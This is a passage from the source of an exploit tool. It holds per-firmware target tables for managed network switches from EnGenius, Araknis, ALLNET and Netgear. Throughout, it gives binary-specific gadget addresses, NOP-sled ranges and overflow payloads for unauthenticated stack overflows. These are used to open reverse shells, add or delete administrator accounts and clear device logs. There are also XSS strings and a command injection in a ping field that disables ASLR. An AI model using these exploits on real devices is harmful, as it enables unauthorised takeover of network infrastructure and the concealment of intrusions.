							'vulnerable': True,
							'safe': True
						},
						'cpl_logo_ul.cgi': {
							'description':'Unauthenticated upload of "logo_icon". (PoC: Upload invalid file)',
							'authenticated': False,
							'response':'json',
							'Content-Type':False,
							'uri':'/cgi-bin/cpl_logo_ul.cgi',
							'content':'Content-Disposition: filename.png\n------',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'cpl_locallogin.cgi': {
							'description':'Stack overflow in "username/password (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi-bin/cpl_locallogin.cgi?redirecturl=AAAA&userurl=BBBB&loginurl=BBBB',
							'content':'username=admin&password=' + self.random_string(196),
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'sn.captivePortal.login': {
							'description':'Stack overflow in "called", XSS in "userurl & uamip" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi-bin/sn.captivePortal.login?cmd=action',
							'content':'mac=dummy&res=dummy&userurl=dummy&uamip=dummy&alertmsg=dummy&called=' + self.random_string(4100),
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'sn.jrpc.dispatch.cgi': {
							'description':'Stack overflow in "usr, pswrd and method" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi-bin/sn.jrpc.dispatch.cgi',
							'content':'{"id":1, "jsonrpc":"2.0","params":{"usr":"admin","pswrd":"' + self.random_string(288) + '"},"method":"login"}',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'sn.captivePortal.auth': {
							'description':'Stack overflow in "user, chap_chal, chap_pass" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi-bin/sn.captivePortal.auth?user=admin&chap_chal=challenge&chap_pass='+ self.random_string(140),
							'content':'',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40E15C,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f99851c,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x24840690,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 6,						# Should leave as-is (but you can play between 5 - 8)
						'safe': True, # Boa/Hydra restart/watchdog, False = no restart, True = restart
						'vulnerable': True,
					},
					'stack_cgi_add_account': {
						# pt: 0 = no password, 1 = cleartext, 2 = encrypted
														# /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
						'address':0x42D1D4,				# Jump one after 'sw $ra'			# (address, binary dependent)
						'account':'&na=USERNAME&pt=2&pw=PASSWORD&pwn=PASSWORD&pv=0&op=1&',			# Admin, priv 15
						'vulnerable': True,
					},
					'stack_cgi_del_account': {
														# /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
						'address':0x42D1D4,				# Jump one after 'sw $ra'			# (address, binary dependent)
						'account':'&na=USERNAME&pt=2&pv=0&op=0',		# 
						'vulnerable': True,				# 
					},
					'stack_cgi_diag': {
														# /sqfs/home/web/cgi-bin/datajson.cgi;  sn_tracertSet()
						# traceroute
						'web_sys_ping_post': 0x42CB8C,	# Jump one after 'sw $ra'			# (address, binary dependent)
						'sys_ping_post_cmd':'&ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check #&mh=30&uid=0',
						'sys_ping_post_check':'',
						'verify_uri':'/conf_tmp/check',

						'vulnerable': True,				# 
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_globalSet()
						'log_settings_set':0x4494E8,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
						'log_ramClear':0x44B0C0,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
						'log_fileClear':0x44B0C0,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
						'sys_timeSntp_set':0x42E438,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject RCE)
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntpDel_set()
						'sys_timeSntpDel_set':0x42E438,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSettings_set()
						'sys_timeSettings_set':0x42E438,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,
					}, 
					'heack_cgi_shell': {
						'cgi':'security.cgi',			# /sqfs/home/web/cgi-bin/security.cgi; main()
						'query':'nop=nop&usr=admin&pswrd=_PWDNOP_RA_START&shellcode=_USRNOP_SHELLCODE',
						'START':0x100271A0,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x104006A0,				# end: You may want to play with this if you dont get it working
						'usr_nop': 987,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 69,					# filler/garbage (not used for something constructive)
						'align': 0,						# Align opcodes in memory
						'stack':False,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},
			'14044-44104': {
				'template':'EnGenius',						# Static for the vendor
				'version':'1.07.22_c1.9.21_181018-0228',					# Version / binary dependent stuff
				'model':'EWS1200-28TFP',				# Model
				'uri':'https://www.engeniustech.com/engenius-products/managed-poe-network-switch-ews1200-28tfp/',
				'verify': { 
						'cpl_locallogin.cgi (XSS)': {
							'description':'XSS in "redirecturl,userurl,loginurl,username,password" (PoC: Count passed XSS)',
							'authenticated': False,
							'response':'xss',
							'Content-Type':False,
							'uri':'/cgi-bin/cpl_locallogin.cgi?redirecturl=<script>alert(XSS);</script>&userurl=<script>alert(XSS);</script>&loginurl=<script>alert(XSS);</script>',
							'content':'username=<script>alert(XSS);</script>&password=<script>alert(XSS);</script>',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'sn.captivePortal.login (XSS)': {
							'description':'XSS in "userurl & uamip" (PoC: Count passed XSS)',
							'authenticated': False,
							'response':'xss',
							'Content-Type':False,
							'uri':'/cgi-bin/sn.captivePortal.login?cmd=action',
							'content':'mac=dummy&res=dummy&userurl=<script>alert(XSS);</script>&uamip=<script>alert(XSS);</script>&alertmsg=dummy&called=dummy',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'cpl_logo_ul.cgi': {
							'description':'Unauthenticated upload of "logo_icon". (PoC: Upload invalid file)',
							'authenticated': False,
							'response':'json',
							'Content-Type':False,
							'uri':'/cgi-bin/cpl_logo_ul.cgi',
							'content':'Content-Disposition: filename.png\n------',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'cpl_locallogin.cgi': {
							'description':'Stack overflow in "username/password (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi-bin/cpl_locallogin.cgi?redirecturl=AAAA&userurl=BBBB&loginurl=BBBB',
							'content':'username=admin&password=' + self.random_string(196),
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'sn.captivePortal.login': {
							'description':'Stack overflow in "called", XSS in "userurl & uamip" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi-bin/sn.captivePortal.login?cmd=action',
							'content':'mac=dummy&res=dummy&userurl=dummy&uamip=dummy&alertmsg=dummy&called=' + self.random_string(4100),
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'sn.jrpc.dispatch.cgi': {
							'description':'Stack overflow in "usr, pswrd and method" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi-bin/sn.jrpc.dispatch.cgi',
							'content':'{"id":1, "jsonrpc":"2.0","params":{"usr":"admin","pswrd":"' + self.random_string(288) + '"},"method":"login"}',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'sn.captivePortal.auth': {
							'description':'Stack overflow in "user, chap_chal, chap_pass" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi-bin/sn.captivePortal.auth?user=admin&chap_chal=challenge&chap_pass='+ self.random_string(140),
							'content':'',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40E15C,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f99851c,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x24840690,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 6,						# Should leave as-is (but you can play between 5 - 8)
						'safe': True, # Boa/Hydra restart/watchdog, False = no restart, True = restart
						'vulnerable': True,
					},
					'stack_cgi_add_account': {
						# pt: 0 = no password, 1 = cleartext, 2 = encrypted
														# /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
						'address':0x42C334,				# Jump one after 'sw $ra'			# (address, binary dependent)
						'account':'&na=USERNAME&pt=2&pw=PASSWORD&pwn=PASSWORD&pv=0&op=1&',			# Admin, priv 15
						'vulnerable': True,
					},
					'stack_cgi_del_account': {
														# /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
						'address':0x42C334,				# Jump one after 'sw $ra'			# (address, binary dependent)
						'account':'&na=USERNAME&pt=2&pv=0&op=0',		# 
						'vulnerable': True,				# 
					},
					'stack_cgi_diag': {
														# /sqfs/home/web/cgi-bin/datajson.cgi;  sn_tracertSet()
						# traceroute
						'web_sys_ping_post': 0x42BCEC,	# Jump one after 'sw $ra'			# (address, binary dependent)
						'sys_ping_post_cmd':'&ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check #&mh=30&uid=0',
						'sys_ping_post_check':'',
						'verify_uri':'/conf_tmp/check',

						'vulnerable': True,				# 
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_globalSet()
						'log_settings_set':0x448008,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
						'log_ramClear':0x449BE0,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
						'log_fileClear':0x449BE0,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
						'sys_timeSntp_set':0x42D598,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject RCE)
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
						'sys_timeSntpDel_set':0x42D598,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
						'sys_timeSettings_set':0x42D598,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,
					}, 
					'heack_cgi_shell': {
						'cgi':'security.cgi',			# /sqfs/home/web/cgi-bin/security.cgi; main()
						'query':'nop=nop&usr=admin&pswrd=_PWDNOP_RA_START&shellcode=_USRNOP_SHELLCODE',
						'START':0x100271A0,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x104006A0,				# end: You may want to play with this if you dont get it working
						'usr_nop': 987,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 69,					# filler/garbage (not used for something constructive)
						'align': 0,						# Align opcodes in memory
						'stack':False,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},

			#
			# Araknis Networks
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : Yes
			# Del /mntlog/flash.log  : Yes
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'8028-89928': {
				'template':'Araknis',					# Static for the vendor
				'version':'1.2.00_171225-1618',			# Version / binary dependent stuff
				'model':'AN-310-SW-16-POE',				# Model
				'uri':'http://araknisnetworks.com/',
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40E04C,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f99851c,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x24840470,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 6,						# Should leave as-is (but you can play between 5 - 8)
						'safe': False, 					# Boa/Hydra restart/watchdog, False = no restart, True = restart
						'vulnerable': True,
					},
					'stack_cgi_diag': {
														# /sqfs/home/web/cgi-bin/datajson.cgi;  sn_tracertSet()
						# traceroute
						'web_sys_ping_post': 0x42A494,	# Jump one after 'sw $ra'			# (address, binary dependent)
						'sys_ping_post_cmd':'&ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check #&mh=30&session_uid=0&uid=0',
						'sys_ping_post_check':'',
						'verify_uri':'/conf_tmp/check',

						'vulnerable': True,				# 
					},
					'stack_cgi_add_account': {
														# /sqfs/home/web/cgi/set.cgi;  sn_EncrypOnly_user_mngSet()
						'address':0x4303B4,				# Jump one after 'sw $ra'			# (address, binary dependent)
						'account':'&na=USERNAME&pw=PASSWORD&pv=0&op=1&',			# Admin, priv 15
						'vulnerable': True,
					},
					'stack_cgi_del_account': {
														# /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
						'address':0x42ADB8,				# Jump one after 'sw $ra'			# (address, binary dependent)
						'account':'&na=USERNAME&pw=&pv=0&op=0',		# 
						'vulnerable': True,				# user
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_globalSet()
						'log_settings_set':0x44DBD8,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
						'log_ramClear':0x44FC88,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
						'log_fileClear':0x44FC88,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
						'sys_timeSntp_set':0x42BAE4,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject RCE)
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
						'sys_timeSntpDel_set':0x42BAE4,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
						'sys_timeSettings_set':0x42BAE4,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,
					}, 
					'heack_cgi_shell': {
						'cgi':'security.cgi',			# /sqfs/home/web/cgi-bin/security.cgi; main()
						# We need these to push NOP and shellcode on higher heap addresses to avoid 0x00
						'query': (self.random_string(1) +'=' + self.random_string(1) +'&') * 110 + 'usr=admin&pswrd=_PWDNOP_RA_START&shellcode=_USRNOP_SHELLCODE',
						#'query':'a=a&' * 110 + 'usr=admin&pswrd=_PWDNOP_RA_START&shellcode=_USRNOP_SHELLCODE',
						'START':0x10010104,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP': 0x10600604,				# end: You may want to play with this if you dont get it working
						'usr_nop': 987,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 69,					# filler/garbage (not used for something constructive)
						'align': 0,						# Align opcodes in memory
						'stack':False,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},

			#
			# ALLNET GmbH Computersysteme 
			# JSON based SG8xxx
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : Yes
			# Del /mntlog/flash.log  : Yes
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'752-76347': {
				'model':'ALL-SG8208M',
				'template':'ALLNET_JSON',					# Static for the vendor
				'version':'2.2.1',						# Version / binary dependent stuff
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40C4FC,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f998528,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x248498dc,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)

						'vulnerable': True,
					},
					'stack_cgi_diag': {
						'vulnerable': False,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': {
						'vulnerable': False,
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi/set.cgi; cgi_log_settings_set()
						'log_settings_set':0x412ADC,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_ramClear_set()
						'log_ramClear':0x412A24,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_fileClear_set()
						'log_fileClear':0x412A24,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSntp_set':0x40FA74,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject RCE)
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSntpDel_set':0x40FA74,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSettings_set':0x40FA74,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': True,
					}, 
					'heack_cgi_shell': {
						'cgi':'set.cgi',				# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
						'START':0x7ffeff04,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x7fc60000,				# end: You may want to play with this if you dont get it working
						'usr_nop': 64,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 77,					# filler/garbage (not used for something constructive)
						'align': 3,						# Align opcodes in memory
						'stack':True,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},

			#
			# ALLNET GmbH Computersysteme 
			# Not JSON based SG8xxx
			# (Traces in this image: 3One Data Communication, Saitian, Sangfor, Sundray, Gigamedia, GetCK, Hanming Technology, Wanbroad, Plexonics, Mach Power, Gigamedia, TG-NET)
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : No
			# Del /mntlog/flash.log  : No
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'222-50100': {
				'template':'ALLNET',					# Static for the vendor
				'version':'3.1.1-R3-B1',					# Version / binary dependent stuff
				'model':'ALL-SG8310PM',				# Model
				'uri':'https://www.allnet.de/en/allnet-brand/produkte/switches/entry-line-layer2-smart-managed-unamanged/poe-switches0/p/allnet-all-sg8310pm-smart-managed-8-port-gigabit-4x-hpoe',
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40C74C,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f99851c,			# la $t9, system) # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x2484029c,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_diag': {
						'vulnerable': False,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
						'log_settings_set':0x46BB04,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
						'log_ramClear':0x46F240,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
						'log_fileClear':0x46F240,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
						'sys_timeSntp_set':0x426724,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject CMD)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
						'sys_timeSntpDel_set':0x426724,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
						'sys_timeSettings_set':0x424D28,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable':False,
					}, 

					# Interesting when there is a fresh heap with 0x00's (4 x 0x00 == MIPS NOP),
					# and to fill wider area with sending '&%8f%84%01=%8f%84%80%18' where:
					# 
					# NOP's
					# '24%04%FF=' : '=' will be replaced with 0x00, li $a0, 0xFFFFFF00
					# '%24%04%FF%FF' : li $a0, 0xFFFFFFFF
					'heack_cgi_shell': {
						'cgi':'dispatcher.cgi',			# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
						'query':'username='+ self.random_string(112) +'_RA_START&password='+ self.random_string(80) +'&login=1'+ ('&%24%04%FF=%24%04%FF%FF' * 50) +'_SHELLCODE',
						'START':0x10010104,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP' :0x10600604,				# end: You may want to play with this if you dont get it working
						'usr_nop': 28,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 20,					# filler/garbage (not used for something constructive)
						'align': 0,						# Align opcodes in memory
						'stack':False,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},

			#
			# Netgear inc.
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : No (logging do not exist)
			# Del /var/log/flash.log : No (logging do not exist)
			# Del /mntlog/flash.log  : No (logging do not exist)
			# Add credentials        : No (Single account only)
			# Del credentials        : No (Single account only)
			#
			'609-31457': {
				'template':'Netgear',						# Static for the vendor
				'model':'GS750E ProSAFE Plus Switch',
				'uri':'https://www.netgear.com/support/product/gs750e.aspx',
				'version':'1.0.0.22',					# Version / binary dependent stuff
				'login': {
					'encryption':'caesar',
					'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
					'query':'{"_ds=1&password=PASSWORD&err_flag=0&err_msg=&submt=&_de=1":{}}',
				},
				'verify': { 
						'set.cgi': {
							'description':'Stack overflow in "password" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'content':'{"_ds=1&password=' + self.random_string(320) + '&err_flag=0&err_msg=&submt=&_de=1":{}}',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x4102F8,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f9984fc,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x24840c6c,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_diag': {
						'vulnerable': False,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_log': {
						'vulnerable': False,
					},
					#
					# Interesting, by adding 0xc1c1c1c1 to START/STOP, remote end will decode to our original START/STOP (including 0x00) =]
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'logout_uri':'/cgi/set.cgi?cmd=home_logout',
						'cgi':'set.cgi',			# /sqfs/home/web/cgi-bin/security.cgi; main()
						'START':0x10001210,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x10006210,				# end: You may want to play with this if you dont get it working
						'usr_nop': 50,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 79,					# filler/garbage (not used for something constructive)
						'align': 0,						# Align opcodes in memory
						'stack':False,					# NOP and shellcode lays on: True = stack, False = Heap
						'query':'{"_ds=1&password=' + self.random_string(316) + '_RA_START&shellcode=_USRNOP_SHELLCODE&_de=1":{}}',
						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True



					},
				},
			},

			#
			# Netgear inc.
			#
			# Note: 
			# 'username' is vulnerable for stack overflow
			# 'pwd' use 'encode()' and not vulnerable for stack overflow (so we cannot jump with 'buffer method'...)
			# Boa/Hydra 'getFdStr()' loop modified, original xploit dont work (0x00 are now ok), weird 'solution' to have $t9 loaded with JMP in 'fwrite()'
			# 'hash=<MD5>' tailing all URI's
			#
			# CGI Reverse Shell      : No
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : No
			# Del /var/log/flash.log : No
			# Del /mntlog/flash.log  : No
			# Add credentials        : No
			# Del credentials        : No
			#
			'639-98866': {
				'template':'Netgear',						# Static for the vendor
				'model':'GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP',
				'uri':'https://kb.netgear.com/000060184/GS728TPv2-GS728TPPv2-GS752TPv2-GS752TPP-Firmware-Version-6-0-0-45',
				'version':'6.0.0.45',					# Version / binary dependent stuff
				'info_leak':False,
				'hash_uri':True,	# tailed 'hash=' md5 hashed URI as csrf token
				'login': {
					'encryption':'encode',
					'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
					'query':'{"_ds=1&username=USERNAME&pwd=PASSWORD&err_flag=0&err_msg=&submt=&_de=1":{}}',
				},
				'verify': { 
						'set.cgi': {
							'description':'Stack overflow in "username" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'content':'{"_ds=1&username='+ self.random_string(100) +'&pwd=NOP&err_flag=0&err_msg=&submt=&_de=1":{}}',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
														# 
						'gadget': 0x45678C,				# Direct heap address for NOP slep and shellcode
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f99853c,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x2484ae5c,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 6,						# Should leave as-is (but you can play between 5 - 8)
						'safe': False
					},
					'stack_cgi_diag': {
						'vulnerable': False,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
				},
			},

			'639-73124': {
				'template':'Netgear',						# Static for the vendor
				'model':'GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP',
				'uri':'https://www.netgear.com/support/product/GS752TPv2#Firmware%20Version%206.0.0.37',
				'version':'6.0.0.37',					# Version / binary dependent stuff
				'info_leak':False,
				'hash_uri':True,	# tailed 'hash=' md5 hashed URI as csrf token
				'login': {
					'encryption':'encode',
					'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
					'query':'{"_ds=1&username=USERNAME&pwd=PASSWORD&err_flag=0&err_msg=&submt=&_de=1":{}}',
				},
				'verify': { 
						'set.cgi': {
							'description':'Stack overflow in "username" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'content':'{"_ds=1&username='+ self.random_string(100) +'&pwd=NOP&err_flag=0&err_msg=&submt=&_de=1":{}}',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
														# 
						'gadget': 0x45778C,				# Direct heap address for NOP slep and shellcode
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f998538,			# la $t9, system # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
